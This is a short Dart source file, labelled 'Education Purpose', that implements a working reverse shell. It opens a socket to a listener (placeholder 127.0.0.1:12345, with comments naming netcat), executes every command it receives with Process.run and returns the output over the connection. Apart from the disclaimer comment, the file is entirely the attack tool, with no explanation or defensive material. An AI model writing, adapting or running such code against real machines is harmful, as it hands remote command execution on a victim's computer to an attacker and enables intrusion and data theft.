/** Adeel Wajid
 * Education Purpose
 */
import 'dart:convert';
import 'dart:io';

void main() {
  //Here will be the port and IP (netcat)
  //Passing the commands of shell
  Socket.connect('127.0.0.1', 12345).then((socket) {
    socket.listen((List<int> event) {
      String command = utf8.decode(event).trim();
      print('Received command: $command');
      executeCommand(command).then((result) {
        socket.write(result);
      });
    });
  }).catchError((e) {
    print('Error connecting to server: $e');
  });
}

Future<String> executeCommand(String command) async {
  List<String> args = command.split(' ');
  ProcessResult result = await Process.run(args[0], args.sublist(1));
  return result.stdout.toString() + result.stderr.toString();
}
